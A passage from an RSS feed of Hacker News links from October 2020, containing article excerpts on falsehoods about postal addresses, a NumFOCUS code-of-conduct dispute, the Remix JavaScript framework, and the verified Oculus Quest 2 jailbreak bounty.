<p>Guy Chisholm provided this counterexample: Minusone Priory Road, Newbury, RG14 7QS</p>

<p>(none of the databases I've checked render this as -1)</p></li>
<li><p><strong>We can put those funny numbers into the building name field, as no buildings have both a name and a funny number</strong></p>

<p>Counterexample: Idas Court, 4-6 Princes Road, Hull, HU5 2RD</p></li>
<li><p><strong>When there's a building name, there won't be a building number (or vice-versa)</strong></p>

<p>Counterexample: Flat 1.4, Ziggurat Building, 60-66 Saffron Hill, London, EC1N 8QX, United Kingdom</p></li>
<li><p><strong>A building number will only be used once per street</strong></p>

<p>The difference between 50 Ammanford Road, Tycroes, Ammanford, SA18 3QJ and 50 Ammanford Road, Llandybie, Ammanford, SA18 3YF is about 4 miles (<a href="https://maps.google.co.uk/maps?q=SA18+3QJ+to+SA18+3YF">Google Maps</a>).</p></li>
<li><p><strong>When there's line with a number in an address, it's the building number.</strong></p>

<p>Counterexample: Flat 18, Da Vinci House, 44 Saffron Hill, London, EC1N 8FH, United Kingdom</p>

<p>You also get suite numbers, floor numbers, unit numbers, and organisations with numbers in their names.</p>

<p>Adrien Pi√©rard contributes an address from Japan with fifteen digits in six separate numbers (five if you count the zip code as a single number). The format is: 980-0804 (zip code), Miyagi-ken (prefecture) Sendai-shi (city) Aoba-ku (ward) Kokubuncho (district) 4-10-20 (sub-district-number block-number lot-number) Sendai (building name) 401 (flat number).</p></li>
<li><p><strong>OK, the first line starting with a number then</strong></p>

<p>Counterexample: 3 Store, 311-318 High Holborn, London, WC1V 7BN</p></li>
<li><p><strong>A building will only have one number</strong></p>

<p>Benton Lam offers this address from the Hong Kong Special Administrative Region - it has both a number on its road (14) and in its group of buildings (3): 15/F, Cityplaza 3, 14 TaiKoo Wan Road, Island East, HKSAR</p></li>
<li><p><strong>The number of buildings is the difference between the highest and lowest building numbers</strong></p>

<p>Tibor Sch√ºtz points out building numbers may be skipped - for example, on a street where even-numbered buildings are on one side, odd numbers on the other; multiple buildings sharing the same number (such as where a new house has been built) and buildings with more than one number.</p>

<p>Cyrille Ch√©p√©lov and Sami Lehtinen tell me in Antibes, France and rural Finland some buildings are numbered based on the distance from the start of the road - such as Longroad 65 for the building 750m from the start of longroad.</p></li>
<li><p><strong>If the addresses on the left of the road are even, the addresses on the right must be odd</strong></p>

<p>Cyrille Ch√©p√©lov points out that in places, <a href="https://maps.google.fr/maps?q=48.857415,2.467167">Boulevard Th√©ophile Sueur, Montreuil, Seine-Saint-Denis, France</a> has evens-only on both sides. The two sides are also in different cities and D√©partements.</p></li>
<li><p><strong>A building name won't also be a number</strong></p>

<p>Ben Tilly reports on Ten Post Office Sq, Boston MA 02109 USA - which is not, reportedly, the same as 10 Post Office Sq, Boston MA 02109 USA.</p></li>
<li><p><strong>Well, at least you can omit leading zeros</strong></p>

<p>Shaun Crampton reports living at 101 Alma St, Apartment 001, Palo Alto - where apartments 1 and 001 were on different floors.</p></li>
<li><p><strong>A street with a building A will not also have a building Alpha</strong></p>

<p>Douglas Perreault reports he lived in a block within a condo association; it was a large association, with blocks A through Z then Alpha, Beta, Gamma, Delta, and Theta. Mail and deliveries were often misrouted from block Alpha to block A and vice-versa. His address at the time was: 14100 N 46th St., Alpha 39, Tampa, FL 33613</p></li>
</ul>

<!-- Composition of street names -->

<ul>
<li><p><strong>A street name won't include a number</strong></p>

<p>8 Seven Gardens Burgh, WOODBRIDGE, IP13 6SU (pointed out by Raphael Mankin)</p></li>
<li><p><strong>OK, but numbers in street names are expressed as words, not digits</strong></p>

<p>Jan Jongboom reports streets can be numbered in the Netherlands - for example, Plein 1944 in Nijmegen.</p></li>
<li><p><strong>When there's a numbered street and a house number, there will be a separator between them</strong></p>

<p>Another from Jan Jongboom: Gondel 2695, Lelystad, means area Gondel, street 26, number 95</p></li>
<li><p><strong>Street names always end in descriptors like 'street', 'avenue', 'drive', 'square', 'hill' or 'view'</strong></p>

<p>They don't always - for example: Piccadilly, London, W1J 9PN</p></li>
<li><p><strong>OK, but when they do have a descriptor there will only be one</strong></p>

<p>A street name can be entirely descriptors: 17 Hill Street, London, W1J 5LJ or <a href="https://en.wikipedia.org/wiki/Avenue_Road">Avenue Road, Toronto, Ontario</a>.</p></li>
<li><p><strong>OK, but when they do have a descriptor it will be at the end</strong></p>

<p>French addresses use prefix descriptors like 'rue', 'avenue', 'place' and 'allee'.</p></li>
<li><p><strong>OK, but if there's a descriptor it'll be at the start or end of the street name.</strong></p>

<p>Or the middle, like 3 Bishops Square Business Park, Hatfield, AL10 9NA</p></li>
<li><p><strong>OK, but at the very least you wouldn't name a town Street</strong></p>

<p><a href="https://maps.google.co.uk/maps?q=Street,+Somerset">Actually there's a town called Street in Somerset, UK</a>.</p></li>
<li><p><strong>Street numbers (and building numbers) don't contain fractions</strong></p>

<p>Dan, Fred Kroon, David Underwood and Daniel Dickison submitted examples of fractional street numbers like <a href="https://maps.google.com/maps?q=43rd%20%C2%BD%20st,%20Pittsburgh,%20PA">43rd ¬Ω St, Pittsburgh, PA</a>, and of fractional building numbers. These can be written in unicode (43rd ¬Ω St), as a fraction with a slash (43 1/2) or as a decimal (43.5)</p>

<p>Gene Wirchenko reports a fractional building number: 1313 1/2 Railroad Ave Bellingham WA 98225-4729</p></li>
<li><p><strong>Street names don't recurr in the same city</strong></p>

<p><a href="https://maps.google.co.uk/maps?q=from:W3+6LJ+to:W5+5DB+to:N8+7PB+to:SE25+6EP+to:E13+0AJ+to:E17+7LD+to:NW10+4LX+to:N1+9TR+to:E1+6PG+to:NW1+0JH+to:W14+8NL+to:SE13+6AD+to:SW19+5DX+to:E11+2AJ+to:SW19+2AE+to:E6+2HJ+&amp;saddr=W3+6LJ&amp;daddr=W5+5DB+to:N8+7PB+to:SE25+6EP+to:E13+0AJ+to:E17+7LD+to:NW10+4LX+to:N1+9TR+to:E1+6PG+to:NW1+0JH+to:W14+8NL+to:SE13+6AD+to:SW19+5DX+to:E11+2AJ+to:SW19+2AE+to:E6+2HJ">Here's a map of the following addresses:</a></p>

<ul>
<li>High Street, London, W3 6LJ</li>
<li>High Street, London, W5 5DB</li>
<li>High Street, London, N8 7PB</li>
<li>High Street, London, SE25 6EP</li>
<li>High Street, London, E13 0AJ</li>
<li>High Street, London, E17 7LD</li>
<li>High Street, London, NW10 4LX</li>
<li>Islington High Street, London, N1 9TR</li>
<li>Shoreditch High Street, London, E1 6PG</li>
<li>Camden High Street, London, NW1 0JH</li>
<li>Kensington High Street, London, W14 8NL</li>
<li>Lewisham High Street, London, SE13 6AD</li>
<li>High Street Wimbledon, London, SW19 5DX</li>
<li>High Street Wanstead, London, E11 2AJ</li>
<li>High Street Colliers Wood, London, SW19 2AE</li>
<li>High Street North, London, E6 2HJ </li>
</ul></li>
<li><p><strong>But street names don't recurr in close proximity</strong></p>

<p>Julian Fleischer provides an example from Bocholt in Germany showing several roads in close proximity all called <a href="https://maps.google.com/maps?q=51.853945,6.615334">Up de Welle</a>.</p></li>
<li><p><strong>An address will be comprised of road names</strong></p>

<p>Kirk Kerekes spent several years using an address of the form "2 mi N then 3 mi W of Jennings, OK 74038" which regularly got successful deliveries. Mike Riley used to mail the Very Large Array radio telescope at "50 miles (80 km) West of Socorro, New Mexico, USA"</p>

<p>Sam pointed me to <a href="http://www.menomoneefallsnow.com/news/99857214.html">Menomonee Falls</a> where houses are addressed using Milwaukee County's grid system instead of house numbers - giving addresses like N88 W16541 Foobar St.</p>

<p>Andy Monat sent the following address example, from a <a href="http://ciapa.tulane.edu/uploads/1_EE_2012_Acceptance_Packet_INFORMATION-1340749206.pdf">semester abroad program at Tulane University </a>: CIAPA, 50 meters north of the Hypermas/Walmart of Curridabat, San Jose, Costa Rica. Adrien Pi√©rard and Luke Allardyce point out street names are seldom used in Japan - instead, districts and blocks and lot numbers are used (more info on the <a href="https://en.wikipedia.org/wiki/Japanese_addressing_system">Wikipedia entry for the Japanese addressing system</a>).  A <a href="http://www.worldpress.org/Americas/592.cfm">2002 World Press Review report</a> gave this sample address: From where the Chinese restaurant used to be, two blocks down, half a block toward the lake, next door to the house where the yellow car is parked, Managua, Nicaragua. Shaun Crampton sent <a href="https://vianica.com/nicaragua/practical-info/14-addresses.html">an article with more details and examples of the Nicaraguan system</a>. Stig Brautaset pointed out <a href="http://www.bbc.co.uk/news/magazine-14806350">a BBC article about post in Kabul</a> gives this example: "Hamid Jaan, behind Darul-Aman palace". Nathan Fellman reports similar addressing is used in Nicaragua and Costa Rica.</p>

<p>Paul Puschmann and Tibor Sch√ºtz pointed out the city of <a href="http://de.wikipedia.org/wiki/Quadratestadt">Mannheim in Germany is sometimes called Quadratestadt (City of Squares)</a> as the city centre is arranged in a grid, with blocks assigned a letter (along the north-south axis) and a number (along the east-west axis) then buildings numbered by block number. So an example address at numbers 6 to 13 on block R 5 would be: Institut f√ºr Deutsche Sprache, R 5, 6-13, D-68161 Mannheim </p>

<p>Leoni Lubbinge gives an example of a South African address: Part 84, Strydfontein 306 JR, Pretoria which means the 84th plot of the farm Strydfontein 306 JR.</p></li>
</ul>

<!-- Elements being present or absent -->

<ul>
<li><p><strong>A road will have a name</strong></p>

<p>Plenty of roads like driveways, onramps and the aisles of carparks don't have names. Some roads in Japan also don't have names, as <a href="https://en.wikipedia.org/wiki/Japanese_addressing_system">the prevalent addressing system works on districts, subdistricts, blocks, lots and lot numbers</a>.</p>

<p>Peter Kenway points out in America some homes are addressed as Rural Routes, where numbers are allocated to boxes on a route covering multiple roads. For example: Box 1234, R.R. 1, Winthrop, ME 04364.</p></li>
<li><p><strong>A road will only have one name</strong></p>

<p>Many different roads, from Goswell Road in London to Regent Road in Edinburgh, make up the 410 mile <a href="https://en.wikipedia.org/wiki/A1_road_%28Great_Britain%29">A1</a>. And while there may only be one "1 Goswell Road" and only one "1 Regent Road" there are multiple buildings numbered 1 on the road designated A1.</p>

<p>Roads may also be named in multiple languages. For example, in Ireland roads may be named in both English and Irish</p></li>
<li><p><strong>Addresses will only have one street</strong></p>

<p>The Royal Mail have what they call a 'dependent street' - for example: 6 Elm Avenue, Runcorn Road, Birmingham, B12 8QX, United Kingdom (Runcorn Road is the street, Elm Avenue is the stubby 'dependent street' and isn't unique within the city. <a href="http://maps.google.co.uk/maps?q=B12+8QX">Google Maps</a> )</p>

<p>Another counterexample: Rogue Hair, 1 Hopton Parade, Streatham High Road, London, SW16 ‚Ä¶</p></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mjt.me.uk/posts/falsehoods-programmers-believe-about-addresses/">https://www.mjt.me.uk/posts/falsehoods-programmers-believe-about-addresses/</a></em></p>]]>
            </description>
            <link>https://www.mjt.me.uk/posts/falsehoods-programmers-believe-about-addresses/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24926417</guid>
            <pubDate>Thu, 29 Oct 2020 02:25:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ireland was WAY beyond my expectations. Why you have to go]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24926249">thread link</a>) | @adeiji1
<br/>
October 28, 2020 | https://graffitiapp.co/story/ireland | <a href="https://web.archive.org/web/*/https://graffitiapp.co/story/ireland">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://graffitiapp.co/story/ireland</link>
            <guid isPermaLink="false">hacker-news-small-sites-24926249</guid>
            <pubDate>Thu, 29 Oct 2020 01:55:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Violated a Code of Conduct]]>
            </title>
            <description>
<![CDATA[
Score 1193 | Comments 903 (<a href="https://news.ycombinator.com/item?id=24926214">thread link</a>) | @tosh
<br/>
October 28, 2020 | https://www.fast.ai/2020/10/28/code-of-conduct/ | <a href="https://web.archive.org/web/*/https://www.fast.ai/2020/10/28/code-of-conduct/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p><span>Written: 28 Oct 2020 by <i>Jeremy Howard</i></span></p><blockquote>
<p><em>Update Oct 20, 2020</em>: NumFOCUS <a href="https://numfocus.org/blog/jeremy-howard-apology">has apologized</a> to me. I accept their apology. I do not accept their assertion that ‚ÄúAt the time of the interview, the committee had not determined that there was a violation of the code of conduct, only that there were two complaints filed and being examined.‚Äù The email to set up the call said ‚ÄúWe would like to schedule a meeting so that we can discuss the results of our investigation with you‚Äù - nothing further. During the call, the committee stated the list of violations, and said ‚Äúthat is what the reporters stated, and what we found‚Äù. I asked why they didn‚Äôt take a statement from me before that finding, and they said ‚Äúwe all watched the video, so we could see for ourselves the violation‚Äù. The committee offered in their apology email to me to have a follow-up discussion, and I declined the offer.</p>
</blockquote>
<blockquote>
<p>Summary: NumFOCUS found I violated their Code of Conduct (CoC) at JupyterCon because my talk was not ‚Äúkind‚Äù, because I said Joel Grus was ‚Äúwrong‚Äù regarding his opinion that Jupyter Notebook is not a good software development environment. Joel (who I greatly respect, and consider an asset to the data science community) was not involved in NumFOCUS‚Äôs action, was not told about it, and did not support it. NumFOCUS did not follow their own enforcement procedure and violated their own CoC, left me hanging for over a week not even knowing what I was accused of, and did not give me an opportunity to provide input before concluding their investigation. I repeatedly told their committee that my emotional resilience was low at the moment due to medical issues, which they laughed about and ignored, as I tried (unsuccessfully) to hold back tears. The process has left me shattered, and I won‚Äôt be able to accept any speaking requests for the foreseeable future. I support the thoughtful enforcement of Code of Conducts to address sexist, racist, and harassing behavior, but that is not what happened in this case.</p>
</blockquote>
<h2 id="overview">Overview</h2>
<p>In my recent JupyterCon keynote, ‚ÄúI Like Jupyter Notebooks‚Äù (re-recording provided at the bottom of this post, if you‚Äôre interested in seeing it for yourself), I sought to offer a rebuttal to Joel Grus‚Äô highly influential JupyterCon presentation ‚Äú<a href="https://www.youtube.com/watch?v=7jiPeIFXb6U">I Don‚Äôt Like Notebooks</a>‚Äù. Joel claimed in his talk that Jupyter is a poor choice for software development and teaching, and I claimed in my talk that it is a good choice. The NumFOCUS committee found me guilty of violating their code of conduct for having not been ‚Äúkind‚Äù in my disagreement with Joel, and for ‚Äúinsulting‚Äù him. The specific reasons given were that:</p>
<ul>
<li>I said that Joel Grus was ‚Äúwrong‚Äù</li>
<li>I used some of his slides (properly attributed) and a brief clip from one of his videos to explain why I thought he was wrong</li>
<li>That I made ‚Äúa negative reference‚Äù to his prior talk</li>
<li>I was also told that ‚Äúas a keynote speaker‚Äù I would ‚Äúbe held to a higher standard than others‚Äù (although this was not communicated to me prior to my talk, nor what that higher standard is)</li>
</ul>
<p>Code of Conducts can be a useful tool, when thoughtfully created and thoughtfully enforced, to address sexism, racism, and harassment, all of which have been problems at tech conferences. Given the <a href="https://medium.com/tech-diversity-files/if-you-think-women-in-tech-is-just-a-pipeline-problem-you-haven-t-been-paying-attention-cb7a2073b996">diversity issues in the tech industry</a>, it is important that we continue the work of making conferences more inclusive, particularly to those from marginalized backgrounds. Having a code of conduct with explicit rules against violent threats, unwelcome sexual attention, repeated harassment, sexually explicit pictures, and other harmful behavior is the first step towards addressing and stopping those behaviors. The JupyterCon code provides the following examples of unacceptable behavior, none of which are at all similar to what I did (i.e. saying that someone was wrong on a technical topic, and explaining how and why):</p>
<ul>
<li>Violent threats or violent language directed against another person</li>
<li>Discriminatory jokes and language</li>
<li>Posting sexually explicit or violent material</li>
<li>Posting (or threatening to post) other people‚Äôs personally identifying information (‚Äúdoxing‚Äù)</li>
<li>Personal insults, especially those using racist or sexist terms</li>
<li>Unwelcome sexual attention</li>
<li>Advocating for, or encouraging, any of the above behavior</li>
<li>Repeated harassment of others. In general, if someone asks you to stop, then stop</li>
</ul>
<p>My experience with the NumFOCUS code of conduct raises a few key issues:</p>
<ul>
<li>The CoC enforcement process involved conflicting &amp; changing information, no opportunity for me to give input, the stress of a long wait of unknown duration with no information about what I was accused of or what would happen next, and the committee members violated their own CoC during the process</li>
<li>There were two totally different Codes of Conduct with different requirements linked in different places</li>
<li>I was held to a different, undocumented and uncommunicated standard</li>
<li>The existence of, or details about, the CoC were not communicated prior to confirmation of the engagement</li>
<li>CoC experts recommend avoiding requirements of politeness or other forms of ‚Äúproper‚Äù behavior, but should focus on a specific list of unacceptable behaviors. The JupyterCon CoC, however, is nearly entirely a list of ‚Äúproper‚Äù behaviors (such as ‚ÄúBe welcoming‚Äù, ‚ÄúBe considerate‚Äù, and ‚ÄúBe friendly‚Äù) that are vaguely defined</li>
<li>CoC experts recommend using a CoC that focuses on a list of unacceptable behaviors. Both the codes linked to JupyterCon have such a link, and none of the unacceptable behavior examples are in any way related or close to what happened in this case. But NumFOCUS nonetheless found me in violation.</li>
</ul>
<p>I would rather not have to write this post at all. However I know that people will ask about why my talk isn‚Äôt available on the JupyterCon site, so I felt that I should explain exactly what happened. In particular, I was concerned that if only partial information became available, the anti-CoC crowd might jump on this as an example of problems with codes of conduct more generally, or might point at this as part of ‚Äúcancel culture‚Äù (a concept I vehemently disagree with, since what is referred to as ‚Äúcancellation‚Äù is often just ‚Äúfacing consequences‚Äù). Finally, I found that being on the ‚Äúother side‚Äù of a code of conduct issue gave me additional insights into the process, and that it‚Äôs important that I should share those insights to help the community in the future.</p>
<h2 id="details">Details</h2>
<p>The rest of this post is a fairly detailed account of what happened, for those that are interested.</p>
<h3 id="my-talk-at-jupytercon">My talk at JupyterCon</h3>
<p>I recently gave a talk at <a href="https://jupytercon.com/">JupyterCon</a>. My partner Rachel gave a <a href="https://www.youtube.com/watch?v=frc7FgheUj4">talk at JupyterCon</a> a couple of years ago, and had a wonderful experience, and I‚Äôm a huge fan of Jupyter, so I wanted to support the project. The conference used to be organized by O‚ÄôReilly, who have always done a wonderful job of conferences I‚Äôve attended, but this year the conference was instead handled by <a href="https://numfocus.org/">NumFOCUS</a>.</p>
<p>For my talk, I decided to focus on Jupyter as a literate and <a href="https://www.fast.ai/2019/12/02/nbdev/">exploratory programming environment</a>, using <a href="https://nbdev.fast.ai/">nbdev</a>. One challenge, however, is that two years earlier Joel Grus had given a brilliant presentation called <a href="https://www.youtube.com/watch?v=7jiPeIFXb6U">I Don‚Äôt Like Notebooks</a> which had been so compelling that I have found it nearly impossible to talk about programming in Jupyter without being told ‚Äúyou should watch this talk which explains why programming in Jupyter is a terrible idea‚Äù.</p>
<p>Joel opened and closed his presentation with some light-hearted digs at me, since I‚Äôd asked him ahead of time <em>not</em> to do such a presentation. So I thought I‚Äôd kill two birds with one stone, and take the opportunity to respond directly to him. Not only was his presentation brilliant, but his slides were hilarious, so I decided to directly parody his talk by using (with full credit of course) some of his slides directly. That way people that hadn‚Äôt seen his talk could both get to enjoy the fantastic content, and also understand just what I was responding to. For instance, here‚Äôs how Joel illustrated the challenge of running cells in the right order:</p>
<figure>
<img srcset="https://www.fast.ai/images/numfocus/joel-order.png 2w" sizes="1px" src="https://www.fast.ai/images/numfocus/joel-order.png">
</figure>
<p>I showed that slide, explaining that it‚Äôs Joel‚Äôs take on the issue, and then followed up with a slide showing how easy it actually is to run all cells in order:</p>
<figure>
<img srcset="https://www.fast.ai/images/numfocus/jeremy-order.png 2w" sizes="1px" src="https://www.fast.ai/images/numfocus/jeremy-order.png">
</figure>
<p>Every slide included a snippet from Joel‚Äôs title slide, which, I explained, showed which slides were directly taken from his presentation. I was careful to ensure I did not modify any of his slides in any way. When first introducing his presentation, I described Joel as ‚Äúa brilliant communicator, really funny, and wrong‚Äù. I didn‚Äôt make any other comments about Joel (although, for the record, I think he‚Äôs awesome, and highly recommend <a href="https://www.amazon.com/Data-Science-Scratch-Principles-Python/dp/1492041130">his book</a>.</p>
<h3 id="the-code-of-conduct-violation-notice">The Code of Conduct violation notice</h3>
<p>A week later, I received an email telling me that two CoC reports were filed regarding my JupyterCon keynote presentation. I was told that ‚ÄúThe Code of Conduct Enforcement Team is meeting tomorrow to review the incident and will be contacting you to inform you of the nature of the report and to understand your perspective‚Äù.</p>
<p>The CoC wasn‚Äôt mentioned at all until after I‚Äôd been invited to speak, had accepted, and had completed the online registration. I had reviewed it at that time, and had been a bit confused. The email I received linked to a <a href="https://jupytercon.com/codeofconduct/">JupyterCon Code of Conduct</a>, but that in turn didn‚Äôt provide much detail about what is and isn‚Äôt OK, and that in turn linked to a different <a href="https://numfocus.org/code-of-conduct">NumFOCUS Code of Conduct</a>. A link was also provided to <a href="https://numfocus.typeform.com/to/ynjGdT">report violations</a>, which also linked to and named the NumFOCUS CoC.</p>
<p>I was concerned that I had done something which might be viewed as a violation, and looked forward to hearing about the nature of the report and having a chance to share my perspective. I was heartened that JupyterCon documented that they follow the <a href="https://numfocus.org/code-of-conduct/response-and-enforcement-events-meetups">NumFOCUS Enforcement Manual</a>. I was also heartened that the manual has a section ‚ÄúCommunicate with the Reported Person about the Incident‚Äù which says they will ‚ÄúLet the reported person tell someone on the CoC response team their side of the story; the person who receives their side of the story should be prepared to ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.fast.ai/2020/10/28/code-of-conduct/">https://www.fast.ai/2020/10/28/code-of-conduct/</a></em></p>]]>
            </description>
            <link>https://www.fast.ai/2020/10/28/code-of-conduct/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24926214</guid>
            <pubDate>Thu, 29 Oct 2020 01:47:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remix ‚Äì a new JavaScript framework from the authors of React Router]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24926162">thread link</a>) | @prezjordan
<br/>
October 28, 2020 | https://remix.run/features | <a href="https://web.archive.org/web/*/https://remix.run/features">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><h3 id="smart-code-splitting">Smart code splitting</h3><p>No matter which page your user lands on, the total footprint of a Remix app is about 50kb over the network (including dependencies). It doesn't matter how large your application gets, each page only downloads what it needs, which is actually pretty uncommon in the React ecosystem.</p><p>React apps are typically built two ways: bundle everything into one enormous file (yikes!) or code split into multiple bundles to load on demand. The apps that code split usually send down a very large build manifest, listing every asset you could possibly need. That means as you add files and pages to your site, the footprint of <em>every page</em> grows.</p><p>Remix never loads more code than the page the user is looking at. You can have 10 or 10,000 routes, the footprint for each remains constant. Just because you added some routes to the photo viewer doesn't mean the contact page gets bigger over the network.</p><h3 id="beyond-heavy-javascript-in-the-browser">Beyond heavy JavaScript in the browser</h3><p>Do you ever look at some of the pages on your website and think "why does this need to download any JavaScript at all?". We do too. Go ahead and open the dev tools on this page you're reading right now.</p><p>Yeah, you, open the dev tools.</p><p>That's right, no JavaScript! This is a marketing page with nothing interactive but links. There's no reason to load JavaScript here. You might think "but wouldn't you be able to speed up the transitions if you loaded in a client side router?" Great question. The answer is, not always.</p><p>Open the devtools again. You'll note in the network tab that we've already loaded in the "/buy" page with a link response header. When you click "buy" (please click buy), the browser already has the page and will navigate there immediately. It can't get faster than that.</p><p>With Remix, you have full control of how your app is delivered at every route. Load a bunch of JavaScript for a really interactive page, or skip it for a static page. Preload a page you think they'll navigate to, or only load that page when they navigate to it. It's all up to you.</p><h3 id="closing-the-gap-between-production-and-development-builds">Closing the gap between production and development builds</h3><p>Remember that one time you were implementing dark mode and put a <code>window.matchMedia</code> in state? Remember how everything was awesome until you deployed and then suddenly the production server was crashing? That's right, there is no window on the server and you weren't server rendering in dev!</p><p>Remember when you pushed some new CSS to production and your elements started bouncing around because your CSS lib was moving style tags around in production but not dev?</p><p>Remember when the requests for code split resources in development seemed fine but in production they were widly different and included way more in them than expected?</p><p>Production bugs live in the delta between development and production environments. Remix closes that gap.</p><p>Remix server renders the same in development as production, loads CSS the same (<code>&lt;link/&gt;</code>, ofc) and code splits the same. How can we do this? We only build the page you're looking at in development, so we can build it like production in a few milliseconds.</p><h3 id="a-refreshing-take-on-css">A refreshing take on CSS</h3><p>Remix lets you use the CSS skills you already have. While we love the innovation that has happened in the CSS-in-JS space, and you can use them in Remix, we provide a back-to-basics approach with a twist.</p><p>One of the trickiest parts of CSS and highly dynamic websites is knowing when to apply it and when to remove it. Because of nested routes, we know the layouts that are being rendered and which aren't. As the user navigates around Remix automatically loads and unloads the styles for the layouts on the page.</p><p>It might sound like no big deal at first, but once you try it you'll realize it's quite powerful.</p><p>Remix also adds a few improvements to CSS like auto prefixing and nesting, and support for tailwind out of the box, but other than that, we keep it simple.</p><h3 id="so-much-more">So much more</h3><p>Perhaps the most unique thing about Remix is that there's hardly any API at all. It gets out of your way wherever it can to allow you to use the web and React the way they were each designed. You have control over every entry point into your app, from the initial request handler to the deepest matching route's meta tags. No plugins, no complicated rendering abstractions, just React and HTTP as designed.</p><h3 id="who-is-remix">Who is Remix?</h3><p>We're Michael Jackson (no, not that one) and Ryan Florence. We've been running the company <a href="https://reacttraining.com/">React Training</a> since 2015. We've taught hundreds of teams and thousands of people at top companies around the world how to get the most out of React while also working our open source projects: React Router, Unpkg, and Reach UI. Before that, we worked on some of the apps at <a href="https://www.alexa.com/topsites/countries/US">the most visited sites on the internet</a> like Twitter (twitter.com) and Canvas (instructure.com).</p><p>As trainers and open source authors, we've seen where teams struggle with React, and we've struggled with these things ourselves! We're now dedicated to helping you build better websites with Remix.</p></article></div>]]>
            </description>
            <link>https://remix.run/features</link>
            <guid isPermaLink="false">hacker-news-small-sites-24926162</guid>
            <pubDate>Thu, 29 Oct 2020 01:35:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Has death due to Covid-19 become less common?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24926073">thread link</a>) | @hn_smarky
<br/>
October 28, 2020 | https://smarky7cd.github.io/covid19/ | <a href="https://web.archive.org/web/*/https://smarky7cd.github.io/covid19/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <nav>
    <ul>
      <li><a href="https://smarky7cd.github.io/">Home</a></li>
      <li><a href="https://smarky7cd.github.io/blog">Blog</a></li>
      <li><a href="https://smarky7cd.github.io/research">Research</a></li>
    </ul>
  </nav>

  <div>

    

<p><img src="https://smarky7cd.github.io/covid19/sams_covid_data.png" alt="Sam's Covid Data"></p><p><a href="https://covid.cdc.gov/covid-data-tracker/#trends_dailytrendsdeaths" target="_blank">CDC Data</a></p>



  </div>



</div>]]>
            </description>
            <link>https://smarky7cd.github.io/covid19/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24926073</guid>
            <pubDate>Thu, 29 Oct 2020 01:21:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Update: The Quest 2 jailbreak has been officially verified]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24926025">thread link</a>) | @vrfinal
<br/>
October 28, 2020 | https://www.vrfinal.com/update-quest-2-jailbreak-has-been-verified/ | <a href="https://web.archive.org/web/*/https://www.vrfinal.com/update-quest-2-jailbreak-has-been-verified/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Last week, <a href="https://www.vrfinal.com/oculus-founder-offers-a-further-5000-reward-for-quest-2-jailbreakers/">we reported that someone had claimed the $10,000 bounty to jailbreak the Oculus Quest 2</a>. Well, this week it's been officially verified.</p><p><em>Mozilla</em>'s Robert Long and <em>Oculus</em> Founder Palmer Luckey came together last week to put up $5000 each as a reward for the task. They also promised that, after a round of crowdfunding, the final bounty would be <em>even higher</em>. Of course, it didn't take long for someone to claim it.</p><p>However, Long soon explained on his Discord server that, after congratulating the budding hacker, he had directed the jailbreaker to "a team of security and legal professionals who can evaluate this claim and determine how to responsibly publish these findings."</p><p>And this week, in a statement on Twitter, Long announced that the claimant's efforts had been verified:</p><figure><img src="https://www.vrfinal.com/content/images/2020/10/ElRXLEpUUAAVKzM.png" alt=""><figcaption>(Credit: @arobertlong, Twitter)</figcaption></figure><p>But now the project has hit a bump in the road and the team have some hard questions to answer. After all, is the jailbreak even legal?</p><p>XR Safety Initiative researchers were able to verify the successful method and are now hard at work "gathering assurances" for other successful jailbreakers to protect them from legal retaliation from Oculus.</p><p>Long has asked other successful hackers to get in touch, explaining that XRSI's "legal and security expertise [have] been crucial in pushing this effort forward":</p><blockquote>"If you are one of those researchers, we urge you to contact us and share the details in a secure manner. Contact XR Safety Initiative XRSI via info@xrsi.org or Use Signal 510-990-4438"</blockquote><figure><img src="https://www.vrfinal.com/content/images/2020/10/goroman-oculus-2-6-e1602602129217-768x431.jpeg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/10/goroman-oculus-2-6-e1602602129217-768x431.jpeg 600w, https://www.vrfinal.com/content/images/2020/10/goroman-oculus-2-6-e1602602129217-768x431.jpeg 768w" sizes="(min-width: 720px) 720px"><figcaption>The successful jailbreak was reported with incredible speed, but now the real challenge begins. (Credit: RoadToRV)</figcaption></figure><p>The jailbreaking grey area revolves around the practice's relationship with "Right to Repair" - a framework which legally gives users full control over the hardware and software they purchase. The practice is already widely accepted in the smartphone world, but the XRSI organisation is campaigning to extend it's use to VR headsets.</p><p>If it all works out, I think the successful hacker is deserving of his $10,000+ reward. And if they can ensure it is legally kosher, the jailbreak will be great news for Oculus Quest 2 fans, too.</p><p><a href="https://www.vrfinal.com/facebook-confirms-that-logging-into-multiple-quest-headsets-wont-get-you-banned/">Especially while the controversy around the Facebook account requirement continues to develop</a>...</p>
          </div></div>]]>
            </description>
            <link>https://www.vrfinal.com/update-quest-2-jailbreak-has-been-verified/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24926025</guid>
            <pubDate>Thu, 29 Oct 2020 01:13:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Corning Announces Pixelligent Partnership, to Develop Next Gen VR Optics]]>
            </title>
            <description>
